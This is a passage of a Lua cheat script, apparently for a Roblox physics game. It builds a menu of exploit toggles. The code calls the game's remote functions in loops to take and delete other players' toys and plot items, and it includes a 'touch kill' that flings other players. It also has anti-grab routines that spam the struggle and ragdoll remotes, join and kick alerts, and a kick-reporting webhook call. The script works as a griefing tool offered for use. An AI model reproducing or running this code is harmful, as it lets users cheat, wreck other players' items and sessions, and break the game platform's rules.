    if not ref or ref == '' then
        return 'Unknown'
    end
    if typeof(ref) == 'Instance' and ref:IsA('Player') then
        local u, d = ref.Name, ref.DisplayName or ''

        return (d ~= '' and d ~= u) and (u .. ' (' .. d .. ')') or u
    end
    if type(ref) == 'string' then
        local p = Players:FindFirstChild(ref)

        if p then
            local u, d = p.Name, p.DisplayName or ''

            return (d ~= '' and d ~= u) and (u .. ' (' .. d .. ')') or u
        end

        return ref
    end
    if type(ref) == 'number' then
        local p = Players:GetPlayerByUserId(ref)

        if p then
            local u, d = p.Name, p.DisplayName or ''

            return (d ~= '' and d ~= u) and (u .. ' (' .. d .. ')') or u
        end

        local ok, name = pcall(function()
            return Players:GetNameFromUserIdAsync(ref)
        end)

        return ok and name or ('uid:' .. ref)
    end

    return tostring(ref)
end
function hookChar(plr, onDied)
    function attach(char)
        local hum = char:WaitForChild('Humanoid', 5)

        if hum then
            hum.Died:Connect(function()
                if db('died_' .. plr.UserId, 3) then
                    onDied(plr)
                end
            end)
        end
    end

    if plr.Character then
        task.spawn(attach, plr.Character)
    end

    plr.CharacterAdded:Connect(attach)
end

cons = {}
rejoinMemory = {}
killLog = {}

function addCon(group, key, conn)
    if not cons[group] then
        cons[group] = {}
    end
    if cons[group][key] then
        pcall(function()
            cons[group][key]:Disconnect()
        end)
    end

    cons[group][key] = conn
end
function clearCon(group, key)
    if cons[group] and cons[group][key] then
        pcall(function()
            cons[group][key]:Disconnect()
        end)

        cons[group][key] = nil
    end
end

NLeft:AddCheckbox('JoinNotify', {
    Text = 'Join Notify',
    Default = false,
    Callback = function(v)
        clearCon('join', 'add')

        if not v then
            return
        end

        addCon('join', 'add', Players.PlayerAdded:Connect(function(plr)
            plr.CharacterAdded:Wait()

            if not db('join_' .. plr.UserId, 5) then
                return
            end

            local ageTag = plr.AccountAge < 30 and 'NEW ACCOUNT' or ''

            Library:Notify({
                Title = 'UNSTABLE',
                Description = rp(plr) .. '\nAccount Age: ' .. plr.AccountAge .. ' Days ' .. ageTag,
                Time = 6,
            })
        end))
    end,
})
NLeft:AddCheckbox('LeaveNotify', {
    Text = 'Leave Notify',
    Default = false,
    Callback = function(v)
        clearCon('join', 'remove')

        if not v then
            return
        end

        addCon('join', 'remove', Players.PlayerRemoving:Connect(function(plr)
            if not db('leave_' .. plr.UserId, 5) then
                return
            end

            Library:Notify({
                Title = 'UNSTABLE',
                Description = rp(plr) .. ' Left the server',
                Time = 4,
            })
        end))
    end,
})
NLeft:AddCheckbox('RejoinNotify', {
    Text = 'Rejoin Notify',
    Default = false,
    Callback = function(v)
        clearCon('join', 'rejoin_add')
        clearCon('join', 'rejoin_rem')

        if not v then
            return
        end

        addCon('join', 'rejoin_rem', Players.PlayerRemoving:Connect(function(plr)
            rejoinMemory[plr.UserId] = {
                t = tick(),
                display = rp(plr),
            }
        end))
        addCon('join', 'rejoin_add', Players.PlayerAdded:Connect(function(plr)
            local entry = rejoinMemory[plr.UserId]

            if not entry then
                return
            end

            plr.CharacterAdded:Wait()

            if not db('rejoin_' .. plr.UserId, 5) then
                return
            end

            local away = math.floor(tick() - entry.t)

            Library:Notify({
                Title = 'UNSTABLE',
                Description = rp(plr) .. ' Rejoined\nAway for: ' .. away .. 's',
                Time = 6,
            })

            rejoinMemory[plr.UserId] = nil
        end))
    end,
})
NLeft:AddCheckbox('FriendJoinNotify', {
    Text = 'Friend Join Noify',
    Default = false,
    Callback = function(v)
        clearCon('join', 'friend')

        if not v then
            return
        end

        addCon('join', 'friend', Players.PlayerAdded:Connect(function(plr)
            local ok, yes = pcall(function()
                return LocalPlayer:IsFriendsWith(plr.UserId)
            end)

            if not (ok and yes) then
                return
            end

            plr.CharacterAdded:Wait()

            if not db('friend_' .. plr.UserId, 5) then
                return
            end

            Library:Notify({
                Title = 'UNSTABLE ',
                Description = rp(plr) .. 'They joined the server and are friends with you',
                Time = 6,
            })
        end))
    end,
})
NLeft:AddCheckbox('NewAccountAlert', {
    Text = 'New Account Notify',
    Default = false,
    Callback = function(v)
        clearCon('join', 'newaccount')

        if not v then
            return
        end

        addCon('join', 'newaccount', Players.PlayerAdded:Connect(function(plr)
            plr.CharacterAdded:Wait()

            if plr.AccountAge >= 30 then
                return
            end
            if not db('newaccount_' .. plr.UserId, 5) then
                return
            end

            Library:Notify({
                Title = 'UNSTABLE',
                Description = rp(plr) .. '\n' .. plr.AccountAge .. ' Day old account',
                Time = 7,
            })
        end))
    end,
})
NLeft:AddCheckbox('GrabSelfNotify', {
    Text = 'Grabbed Notify',
    Default = false,
    Callback = function(v)
        clearCon('grab', 'self')

        if not v then
            return
        end

        local isHeld = LocalPlayer:WaitForChild('IsHeld', 5)

        if not isHeld then
            return
        end

        addCon('grab', 'self', isHeld.Changed:Connect(function()
            if isHeld.Value then
                if not db('grabbed_self', 3) then
                    return
                end

                local head = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Head')
                local po = head and head:FindFirstChild('PartOwner')
                local who = (po and po.Value ~= '') and rp(po.Value) or 'Someone'

                Library:Notify({
                    Title = 'UNSTABLE',
                    Description = who .. ' Is grabbing you!',
                    Time = 5,
                })
            else
                if db('released_self', 3) then
                    Library:Notify({
                        Title = 'Released',
                        Description = 'You were released',
                        Time = 3,
                    })
                end
            end
        end))
    end,
})
NLeft:AddCheckbox('BlackHoleWatch', {
    Text = 'Kick Notify',
    Default = false,
    Callback = function(v)
        clearCon('world', 'bh_add')
        clearCon('world', 'bh_remove')

        if not v then
            return
        end

        addCon('world', 'bh_add', workspace.ChildAdded:Connect(function(child)
            if child.Name ~= 'BlackHoleKick' then
                return
            end

            addCon('world', 'bh_remove', Players.PlayerRemoving:Connect(function(plr2)
                if not db('kick_' .. plr2.UserId, 5) then
                    return
                end

                Library:Notify({
                    Title = 'UNSTABLE',
                    Description = rp(plr2) .. ' has been KICKED',
                    Time = 6,
                })
                sendKickWebhook(plr2, 'Praise', 'BlackHoleKick')

                child.Name = plr2.Name .. 'KICK'
            end))
        end))
    end,
})
NLeft:AddCheckbox('BlackHoleRejoin', {
    Text = 'Kicked Player Rejoin Notify',
    Default = false,
    Callback = function(v)
        clearCon('world', 'bh_rejoin')

        if not v then
            return
        end

        addCon('world', 'bh_rejoin', Players.PlayerAdded:Connect(function(plr)
            for _, child in ipairs(workspace:GetChildren())do
                if child.Name == plr.Name .. 'KICK' then
                    if not db('rejoinbh_' .. plr.UserId, 5) then
                        return
                    end

                    Library:Notify({
                        Title = 'UNSTABLE',
                        Description = plr.Name .. ' rejoined after being kicked!',
                        Time = 8,
                    })

                    break
                end
            end
        end))
    end,
})

Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
RunService = game:GetService('RunService')
Workspace = game:GetService('Workspace')
LocalPlayer = Players.LocalPlayer
rs = ReplicatedStorage
GrabEvents = rs:WaitForChild('GrabEvents')
SetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
SetNetworkOwnerRemote = SetNetworkOwner
DestroyGrabLine = GrabEvents:FindFirstChild('DestroyGrabLine')
CreateGrabEvent = GrabEvents:FindFirstChild('CreateGrabLine')
RagdollRemote = rs:WaitForChild('CharacterEvents'):WaitForChild('RagdollRemote')
folder = Workspace:WaitForChild(LocalPlayer.Name .. 'SpawnedInToys')
cons = {}
SL = 'off'
antiok = false
lastSafePosition = nil
teleportDetected = false
lastCheckTime = tick()
positionHistory = {}
maxHistory = 10
isHeldSpamDetected = false
heldChangeTimes = {}
heldSpamThreshold = 8
lastHeldValue = false
struggling = false
lastStruggleTime = 0
struggleCooldown = 0.5
defenseEnabled = false
defenseConnection = nil
defenseMode = 'Fling'
looptp = false
loopStartPos = nil
currentStyle = 'Desync Random'
currentAreaName = 'Spawn'
speed = 1
radius = 100
height = 0
antiblob = false
antiBlobmanGrabEnabled = false
antiSeatResetEnabled = false
lastSeat = nil
GUCCIISTUFF = false
autoGucciActive = false
restoreFrames = 0
safePosition = nil
antiGucciConnection = nil
antiGayConn = nil
AntiBringConnection = nil
GrabData = {
    deleteToggle = false,
    bringToggle = false,
    lp = LocalPlayer,
    ws = Workspace,
    bringOffset = CFrame.new(0, 0, -4),
    voidPos = CFrame.new(0, -9999, 0),
    toggle = false,
    dropPos = CFrame.new(-238.98, -256.01, -123.97),
}
AntiInputLagDelay = 0
AntiInputLagBurst = 3
SelectedToy = nil
lagThreshold = 100
lagCooldown = 3
lastLagTime = 0
lagEventHistory = {}
MAX_HISTORY = 10
autoAntiLagEnabled = false
autoAntiLagFPS = 15
AK = false
antiAntiLagEnabled = false
antiStickyT = false
AntiRagBlob = false
RagdolledSit = false
holdItemLoop = nil
Cons = {}
FoodToggle = false
HeartbeatConnection = nil
currentFood = nil
lastSpawn = 0
spawnCooldown = 0.5
Root = nil
frozenCFrame = nil
cameraConnection = nil
isDoubleResetting = false
BreakHoldablesEnabled = false
TouchKill = {
    active = false,
    mainThread = nil,
    moveThread = nil,
}
AutoPCLDBreaker = false
PCLDConnection = nil
debounce = false
tpland = tpland or {
    Spawn = Vector3.new(0, 0, 0),
}
TeleportStyles = {
    'Desync Random',
    'Anti Grab',
    'Behind Target',
    'Spin Desync',
    'Jitter',
    'Far Warp',
    'Micro Blink',
}
TeleportAreas = {
    Spawn = CFrame.new(0, -7.35, 0),
    Barn = CFrame.new(-228, 82, -318),
    Void = CFrame.new(0, -5E3, 0),
    Heaven = CFrame.new(0, 500000, 0),
    Sky = CFrame.new(0, 10000, 0),
    Underground = CFrame.new(0, -1E3, 0),
}
ToyList = {
    Coconut = 'FoodCoconut',
    Banana = 'FoodBanana',
    Fries = 'FoodFrenchFries',
    MeatStick = 'FoodMeatStick',
    Poop = 'PoopPile',
    Donut = 'FoodDonut',
    Cake = 'FoodCakePink',
    Burger = 'FoodHamburger',
    Pizza = 'FoodPizzaCheese',
    Hotdog = 'FoodHotdog',
    Mushroom = 'FoodMushroomPoison',
    Banjo = 'InstrumentGuitarBanjo',
    Violin = 'InstrumentGuitarViolin',
    Ukulele = 'InstrumentGuitarUkulele',
    Sax = 'InstrumentWoodwindSaxophone',
    Vuvuzela = 'InstrumentBrassVuvuzela',
    Bongos = 'InstrumentDrumBongos',
    Mic = 'InstrumentVoiceMicrophone',
    Piano = 'InstrumentPianoMelodica',
    Ocarina = 'InstrumentWoodwindOcarina',
    Trumpet = 'InstrumentBrassTrumpet',
    Snare = 'InstrumentDrumSnare',
    Pepperoni = 'FoodPizzaPepperoni',
    Bread = 'FoodBread',
    Egg = 'FoodDippyEgg',
    Mayo = 'FoodMayonnaise',
    WhiteMug = 'CupMugWhite',
    BrownMug = 'CupMugBrown',
    SparklePoop = 'PoopPileSparkle',
    Broccoli = 'FoodBroccoli',
    SodaCan = 'FoodSodaCan',
    Bugle = 'InstrumentBrassBugle',
    Acoustic = 'InstrumentGuitarAcoustic',
    Lyre = 'InstrumentGuitarLyre',
    Keyboard = 'InstrumentPianoKeyboard',
}
AllowedItems = {
    FoodHamburger = true,
    FoodCoconut = true,
    FoodPizzaCheese = true,
    FoodPizzaPepperoni = true,
    FoodHotdog = true,
    FoodMushroomPoison = true,
    FoodBread = true,
    FoodDippyEgg = true,
    FoodMayonnaise = true,
    FoodFrenchFries = true,
    FoodMeatStick = true,
    FoodDonut = true,
    FoodCakePink = true,
    InstrumentGuitarBanjo = true,
    InstrumentGuitarViolin = true,
    InstrumentGuitarUkulele = true,
    InstrumentWoodwindSaxophone = true,
    InstrumentWoodwindOcarina = true,
    InstrumentBrassVuvuzelaQwizik = true,
    InstrumentBrassTrumpet = true,
    InstrumentDrumBongos = true,
    InstrumentDrumSnare = true,
    InstrumentPianoMelodica = true,
    InstrumentVoiceMicrophone = true,
    CupMugWhite = true,
    CupMugBrown = true,
    PoopPile = true,
    PoopPileSparkle = true,
}
DropdownValues = {}

for shortName in pairs(ToyList)do
    table.insert(DropdownValues, shortName)
end

table.sort(DropdownValues)

SelectedToy = #DropdownValues > 0 and ToyList[DropdownValues[1] ] or nil

function getCharacter(player)
    return player.Character or (player.CharacterAdded and player.CharacterAdded:Wait()) or nil
end
function getHumanoidRootPart(character)
    return character and character:FindFirstChild('HumanoidRootPart') or nil
end
function getHumanoid(character)
    return character and character:FindFirstChild('Humanoid') or nil
end
function getDistance(part1, part2)
    return (part1.Position - part2.Position).Magnitude
end
function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end
function gethrp()
    if LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

        if hrp then
            Root = hrp
        end
    end

    return Root
end
function Disc(connectionName)
    if Cons[connectionName] then
        Cons[connectionName]:Disconnect()

        Cons[connectionName] = nil
    end
end
function FWC(parent, childName)
    return parent:FindFirstChild(childName)
end
function setAntiLag(enabled)
    LocalPlayer.PlayerScripts.CharacterAndBeamMove.Enabled = not enabled
end
function logLagEvent(name)
    table.insert(lagEventHistory, 1, {
        player = name,
        time = os.clock(),
        lines = Lines,
    })

    if #lagEventHistory > MAX_HISTORY then
        table.remove(lagEventHistory, MAX_HISTORY + 1)
    end
end
function freezeCamera()
    frozenCFrame = Workspace.CurrentCamera.CFrame
    cameraConnection = RunService.RenderStepped:Connect(function()
        if frozenCFrame then
            Workspace.CurrentCamera.CFrame = frozenCFrame
        end
    end)
end
function unfreezeCamera()
    if cameraConnection then
        cameraConnection:Disconnect()

        cameraConnection = nil
    end

    frozenCFrame = nil
    Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
end

local _pairs = pairs
local _ipairs = ipairs
local _wait = task.wait

function DeleteItem(item)
    local hold = item:FindFirstChild('HoldPart')

    if not hold then
        return
    end

    local grab = hold:FindFirstChild('HoldItemRemoteFunction')

    if grab then
        pcall(function()
            grab:InvokeServer(item, GrabData.lp.Character)
        end)
    end

    pcall(function()
        hold:Destroy()
    end)
end
function BringItem(item)
    local hold = item:FindFirstChild('HoldPart')

    if not hold then
        return
    end

    local grab = hold:FindFirstChild('HoldItemRemoteFunction')
    local drop = hold:FindFirstChild('DropItemRemoteFunction')

    if grab and drop then
        pcall(function()
            local ch = GrabData.lp.Character
            local hrp = ch and ch:FindFirstChild('HumanoidRootPart')

            if not hrp then
                return
            end

            grab:InvokeServer(item, ch)
            drop:InvokeServer(item, hrp.CFrame * GrabData.bringOffset, Vector3.zero)
        end)
    end
end
function ProcessItem(obj)
    if not obj:IsA('Model') then
        return
    end

    local hold = obj:FindFirstChild('HoldPart')

    if not hold then
        return
    end
    if not hold:FindFirstChild('HoldItemRemoteFunction') then
        return
    end
    if GrabData.deleteToggle then
        DeleteItem(obj)
    elseif GrabData.bringToggle then
        BringItem(obj)
    end
end
function LoopGrab()
    while GrabData.deleteToggle or GrabData.bringToggle do
        for _, f in ipairs(GrabData.ws:GetChildren())do
            if f:IsA('Folder') and f.Name:find('SpawnedInToys') then
                for _, obj in ipairs(f:GetDescendants())do
                    ProcessItem(obj)
                end
            end
        end

        local plotItems = GrabData.ws:FindFirstChild('PlotItems')

        if plotItems then
            for _, plot in pairs(plotItems:GetChildren())do
                if plot.Name ~= 'PlayersInPlots' then
                    for _, obj in pairs(plot:GetChildren())do
                        ProcessItem(obj)
                    end
                end
            end
        end

        task.wait(0.01)
    end
end
function SetMode(mode)
    GrabData.deleteToggle = (mode == 'delete')
    GrabData.bringToggle = (mode == 'bring')

    if mode then
        task.spawn(LoopGrab)
    end
end
function GrabItem(item)
    local hold = item:FindFirstChild('HoldPart')

    if not hold then
        return
    end

    local grab = hold:FindFirstChild('HoldItemRemoteFunction')
    local drop = hold:FindFirstChild('DropItemRemoteFunction')

    if not (grab and drop) then
        return
    end

    pcall(function()
        grab:InvokeServer(item, GrabData.lp.Character)
    end)
    pcall(function()
        drop:InvokeServer(item, GrabData.dropPos, Vector3.new())
    end)
end
function GrabFolder(f)
    for _, obj in ipairs(f:GetDescendants())do
        if obj:IsA('Model') and obj:FindFirstChild('HoldPart') then
            if obj.HoldPart:FindFirstChild('HoldItemRemoteFunction') then
                GrabItem(obj)
            end
        end
    end
end
function LoopGrabDelete()
    while GrabData.toggle do
        for _, f in _ipairs(GrabData.ws:GetChildren())do
            if f:IsA('Folder') and f.Name:find('SpawnedInToys') then
                GrabFolder(f)
            end
        end

        local plotItems = GrabData.ws:FindFirstChild('PlotItems')

        if plotItems then
            for _, plot in _pairs(plotItems:GetChildren())do
                if plot.Name ~= 'PlayersInPlots' then
                    for _, model in _pairs(plot:GetChildren())do
                        if model:IsA('Model') and model:FindFirstChild('HoldPart') then
                            if model.HoldPart:FindFirstChild('HoldItemRemoteFunction') then
                                GrabItem(model)
                            end
                        end
                    end
                end
            end
        end

        _wait(0.001)
    end
end
function LoopGrabDelete()
    while GrabData.toggle do
        for _, f in _ipairs(GrabData.ws:GetChildren())do
            if f:IsA('Folder') and f.Name:find('SpawnedInToys') then
                GrabFolder(f)
            end
        end

        local plotItems = GrabData.ws:FindFirstChild('PlotItems')

        if plotItems then
            for _, plot in _pairs(plotItems:GetChildren())do
                if plot.Name ~= 'PlayersInPlots' then
                    for _, model in _pairs(plot:GetChildren())do
                        if model:IsA('Model') and model:FindFirstChild('HoldPart') then
                            if model.HoldPart:FindFirstChild('HoldItemRemoteFunction') then
                                GrabItem(model)
                            end
                        end
                    end
                end
            end
        end

        _wait(0.001)
    end
end
function HoldAndDrop(item)
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end

    local hold = item:FindFirstChild('HoldPart')

    if not hold then
        return
    end

    local grab = hold:FindFirstChild('HoldItemRemoteFunction')
    local drop = hold:FindFirstChild('DropItemRemoteFunction')

    if not grab or not drop then
        return
    end

    pcall(function()
        grab:InvokeServer(item, char)
    end)
    pcall(function()
        drop:InvokeServer(item, hrp.CFrame * CFrame.new(0, 0, -5), nil)
    end)
end
function spawnfood()
    if tick() - lastSpawn < spawnCooldown then
        return
    end

    lastSpawn = tick()

    if not Root then
        return
    end

    rs.MenuToys.SpawnToyRemoteFunction:InvokeServer('FoodHamburger', Root.CFrame * CFrame.new(5, 0, 5), Vector3.new(0, 33.088, 0))
end
function hold(food)
    if not food or not food.Parent then
        return
    end

    local hp = food:FindFirstChild('HoldPart')

    if not hp then
        return
    end

    hp.HoldItemRemoteFunction:InvokeServer(food, LocalPlayer.Character)
    hp.DropItemRemoteFunction:InvokeServer(food, CFrame.new(-128.375, -10.35, 72.18), Vector3.new(0, 154.777, 0))
end
function doubleFastReset()
    if isDoubleResetting then
        return
    end

    isDoubleResetting = true

    local respawnConnection

    respawnConnection = LocalPlayer.CharacterAdded:Connect(function(newCharacter)
        if respawnConnection then
            respawnConnection:Disconnect()

            respawnConnection = nil
        end

        task.spawn(function()
            local humanoid = newCharacter:WaitForChild('Humanoid', 3)

            if humanoid then
                task.wait(0.1)

                humanoid.Health = 0
            end

            isDoubleResetting = false
        end)
    end)

    local character = LocalPlayer.Character

    if character then
        local humanoid = character:FindFirstChildOfClass('Humanoid')

        if humanoid then
            humanoid.Health = 0
        else
            character:BreakJoints()
        end
    else
        isDoubleResetting = false

        if respawnConnection then
            respawnConnection:Disconnect()
        end
    end
end
function createTruePospart()
    local ch = LocalPlayer.Character

    if not ch then
        return
    end
    if ch:FindFirstChild('TruePositionPart') then
        return ch.TruePositionPart
    end

    local tp = Instance.new('Part')

    tp.Name = 'TruePositionPart'
    tp.Anchored = true
    tp.CanCollide = false
    tp.Transparency = 1
    tp.Size = Vector3.new(1, 1, 1)
    tp.CFrame = CFrame.new(0, -100, 0)
    tp.Parent = ch

    return tp
end
function dropFromBlobs()
    local ch = LocalPlayer.Character

    if not ch then
        return
    end

    local hrp = ch:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end

    function tryDrop(item)
        pcall(function()
            local s = item:FindFirstChild('BlobmanSeatAndOwnerScript')
            local det = item:FindFirstChild('RightDetector')

            if s and det then
                local drop = s:FindFirstChild('CreatureDrop')
                local weld = det:FindFirstChild('RightWeld')

                if drop and weld then
                    drop:FireServer(weld, hrp)
                    rs.CharacterEvents.Struggle:FireServer(LocalPlayer)
                end
            end
        end)
    end

    for _, plot in pairs(Workspace.PlotItems:GetChildren())do
        if plot.Name ~= 'PlayersInPlots' then
            for _, itm in pairs(plot:GetChildren())do
                if itm.Name == 'CreatureBlobman' then
                    tryDrop(itm)
                end
            end
        end
    end
    for _, p in pairs(Players:GetPlayers())do
        local tf = Workspace:FindFirstChild(p.Name .. 'SpawnedInToys')

        if tf then
            for _, itm in pairs(tf:GetChildren())do
                if itm.Name == 'CreatureBlobman' then
                    tryDrop(itm)
                end
            end
        end
    end
end
function setMassless()
    local ch = LocalPlayer.Character

    if not ch then
        return
    end

    for _, prt in pairs(ch:GetChildren())do
        if prt:IsA('BasePart') and prt.Massless then
            prt.Massless = false

            dropFromBlobs()
        end
    end
end
function moveRootAttachment()
    local ch = LocalPlayer.Character

    if not ch then
        return
    end

    local hrp = ch:FindFirstChild('HumanoidRootPart')
    local truePart = ch:FindFirstChild('TruePositionPart')

    if hrp and truePart then
        local ra = hrp:FindFirstChild('RootAttachment')

        if ra then
            task.wait(0.2)

            ra.Parent = truePart
        end
    end
end
function restoreRootAttachment()
    local ch = LocalPlayer.Character

    if not ch then
        return
    end

    local hrp = ch:FindFirstChild('HumanoidRootPart')
    local truePart = ch:FindFirstChild('TruePositionPart')

    if hrp and truePart then
        local ra = truePart:FindFirstChild('RootAttachment')

        if ra then
            ra.Parent = hrp
        end

        truePart:Destroy()
    end
end
function antiblobLoop()
    while antiblob do
        pcall(function()
            if LocalPlayer.Character then
                createTruePospart()
                setMassless()

                local hrp = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                if hrp and hrp:FindFirstChild('RootAttachment') then
                    local tp = LocalPlayer.Character:FindFirstChild('TruePositionPart')

                    if tp and not tp:FindFirstChild('RootAttachment') then
                        moveRootAttachment()
                    end
                end
            end
        end)
        task.wait(0.1)
    end
end
function startAntiSeatReset()
    task.spawn(function()
        while antiSeatResetEnabled and task.wait(0.1) do
            local ch = LocalPlayer.Character

            if ch then
                local hum = ch:FindFirstChild('Humanoid')

                if hum then
                    local isHeld = LocalPlayer:FindFirstChild('IsHeld')

                    if isHeld and isHeld.Value then
                        if hum.SeatPart then
                            lastSeat = hum.SeatPart
                        end
                        if lastSeat and hum.SeatPart ~= lastSeat then
                            while isHeld.Value and task.wait() do end

                            pcall(function()
                                lastSeat:Sit(hum)
                            end)
                        end
                    end
                end
            end
        end
    end)
end

local ACGE = false
local AGE = false
local plot = nil

function AntiGrabLoop()
    local st, model

    while ACGE do
        model = Workspace[LocalPlayer.Name .. 'SpawnedInToys']:FindFirstChild('InstrumentWoodwindOcarina') or (plot and Workspace.PlotItems[plot]:FindFirstChild('InstrumentWoodwindOcarina'))

        if model then
            if LocalPlayer.Character then
                for _, prt in pairs(LocalPlayer.Character:GetChildren())do
                    if prt:FindFirstChild('PartOwner') and prt.PartOwner.Value ~= '' then
                        if model:FindFirstChild('HoldPart') then
                            if model.HoldPart:FindFirstChild('HoldItemRemoteFunction') then
                                task.spawn(function()
                                    model.HoldPart.HoldItemRemoteFunction:InvokeServer(model, LocalPlayer.Character)
                                end)
                                rs.MenuToys.DestroyToy:FireServer(model)

                                if LocalPlayer.Character:FindFirstChild('Humanoid') then
                                    LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

                                    LocalPlayer.Character.Humanoid.AutoRotate = true
                                end

                                CAS:UnbindAction('Escape')
                                CAS:UnbindAction('JumpRemover')

                                prt.PartOwner.Value = ''

                                if LocalPlayer.Character.Humanoid.Sit then
                                    LocalPlayer.Character.Humanoid.Sit = false
                                end
                            end
                        end
                    end
                end
            end
        else
            if LocalPlayer.Character and LocalPlayer:FindFirstChild('CanSpawnToy') and LocalPlayer.CanSpawnToy.Value and not st then
                st = tick()

                task.spawn(function()
                    rs.MenuToys.SpawnToyRemoteFunction:InvokeServer('InstrumentWoodwindOcarina', CFrame.new(1e5, 1e5, 1e5), Vector3.new(0, 0, 0))
                end)
            elseif st and tick() - st > 1 and not Workspace[LocalPlayer.Name .. 'SpawnedInToys']:FindFirstChild('InstrumentWoodwindOcarina') then
                st = nil
            end

            local grabbed = false

            if LocalPlayer.Character then
                for _, prt in pairs(LocalPlayer.Character:GetChildren())do
                    if prt:FindFirstChild('PartOwner') and prt.PartOwner.Value ~= '' then
                        grabbed = true
                    end
                end
            end
            if grabbed then
                rs.CharacterEvents.Struggle:FireServer(LocalPlayer)

                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                    rs.CharacterEvents.RagdollRemote:FireServer(LocalPlayer.Character.HumanoidRootPart, 0.00000000001)

                    for _, track in ipairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                        if track.Animation.AnimationId == 'rbxassetid://7047322890' then
                            track:Stop()
                        end
                    end
                end

                task.wait()
            end
        end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and (AGE or ACGE) then
            for _, track in ipairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                if track.Animation.AnimationId == 'rbxassetid://7047322890' then
                    track:Stop()
                end
            end
        end

        task.wait()
    end
end
function startTouchKill()
    TouchKill.active = true
    TouchKill.mainThread = task.spawn(function()
        for _, plr in pairs(Players:GetPlayers())do
            if plr ~= LocalPlayer and plr.Character then
                for _, v in pairs(plr.Character:GetDescendants())do
                    if v:IsA('BasePart') then
                        v.CanCollide = false
                    end
                end
            end
        end
    end)
    TouchKill.moveThread = task.spawn(function()
        while TouchKill.active do
            task.wait()

            local isHeld = LocalPlayer:FindFirstChild('IsHeld')

            if isHeld and isHeld.Value then
                continue
            end

            local character = LocalPlayer.Character

            if character and character:FindFirstChild('Humanoid') then
                character.Humanoid:Move(Vector3.one * 1e31)
            end
        end
    end)
end
function stopTouchKill()
    TouchKill.active = false

    if TouchKill.mainThread then
        task.cancel(TouchKill.mainThread)

        TouchKill.mainThread = nil
    end
    if TouchKill.moveThread then
        task.cancel(TouchKill.moveThread)

        TouchKill.moveThread = nil
    end
end
function hookSeat(hum2, HRP2)
    Cons.ARSeat = hum2:GetPropertyChangedSignal('SeatPart'):Connect(function()
        if hum2.SeatPart and hum2.SeatPart.Parent.Name == 'CreatureBlobman' and not RagdolledSit then
            RagdolledSit = true

            local Seat = hum2.SeatPart

            while not hum2.Sit do
                task.wait()
            end

            RagdollRemote:FireServer(HRP2, 3)

            while not hum2.Ragdolled.Value and not hum2.Sit do
                task.wait()
            end

            task.wait(0.4)

            hum2.Sit = false

            Seat:Sit(hum2)
            task.delay(0.25, function()
                while hum2 and hum2.SeatPart do
                    RagdollRemote:FireServer(LocalPlayer.Character.HumanoidRootPart, 1)
                    task.wait(0.05)
                end

                RagdolledSit = false
            end)
        end
    end)
end

task.spawn(function()
    while task.wait() do
        if not BreakHoldablesEnabled then
            continue
        end

        for _, f in ipairs(Workspace:GetChildren())do
            if f:IsA('Folder') and f.Name:find('SpawnedInToys') then
                for _, item in ipairs(f:GetDescendants())do
                    if item:IsA('Model') and item:FindFirstChild('HoldPart') then
                        HoldAndDrop(item)
                    end
                end
            end
        end

        local plotItems = Workspace:FindFirstChild('PlotItems')

        if plotItems then
            for _, plot in ipairs(plotItems:GetChildren())do
                if plot.Name ~= 'PlayersInPlots' then
                    for _, item in ipairs(plot:GetDescendants())do
                        if item:IsA('Model') and item:FindFirstChild('HoldPart') then
                            HoldAndDrop(item)
                        end
                    end
                end
            end
        end
    end
end)
workspace.DescendantAdded:Connect(function(d)
    if d.Name == 'GrabBeam' then
        Lines += 1

        lagger = d.Parent.Parent.Parent
    end
end)
folder.ChildAdded:Connect(function(child)
    if child.Name == 'FoodHamburger' then
        currentFood = child
    end
end)
LocalPlayer.CharacterAdded:Connect(function()
    if antiStickyT then
        task.wait(1)

        local ps = LocalPlayer:FindFirstChild('PlayerScripts')

        if ps then
            local sticky = ps:FindFirstChild('StickyPartsTouchDetection')

            if sticky then
                sticky.Disabled = true
            end
        end
    end
end)
LocalPlayer.CharacterAdded:Connect(function()
    if defenseEnabled then
        task.wait(1)
        startDefense()
    end
end)

Players = game:GetService('Players')
UserInputService = game:GetService('UserInputService')
Players = game:GetService('Players')
RunService = game:GetService('RunService')
Workspace = game:GetService('Workspace')
RS = game:GetService('ReplicatedStorage')
LocalPlayer = Players.LocalPlayer
SpawnToyRF = RS:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
RagdollRemote = RS:WaitForChild('CharacterEvents'):WaitForChild('RagdollRemote')
player = Players.LocalPlayer
mouse = player:GetMouse()
Players = game:GetService('Players')
TweenService = game:GetService('TweenService')
CAS = game:GetService('ContextActionService')
RS = game:GetService('ReplicatedStorage')
player = Players.LocalPlayer
lp = player
character = lp.Character or lp.CharacterAdded:Wait()

lp.CharacterAdded:Connect(function(c)
    character = c
end)

ACGE = false
antiGrabThread = nil

function cheekyAntiGrab()
    local st
    local model

    while ACGE do
        local lp = game.Players.LocalPlayer
        local char = lp.Character

        if char and char:FindFirstChild('Humanoid') then
            for _, track in ipairs(char.Humanoid:GetPlayingAnimationTracks())do
                if track.Animation.AnimationId == 'rbxassetid://7047322890' then
                    track:Stop()
                end
            end
        end

        local toyFolder = workspace:FindFirstChild(lp.Name .. 'SpawnedInToys')

        if toyFolder then
            model = toyFolder:FindFirstChild('FoodMayonnaise')
        end
        if char then
            function checkgrab(obj)
                if obj:FindFirstAncestor('Plots') or obj:FindFirstAncestor('Slots') or obj:FindFirstAncestor('Map') then
                    return
                end

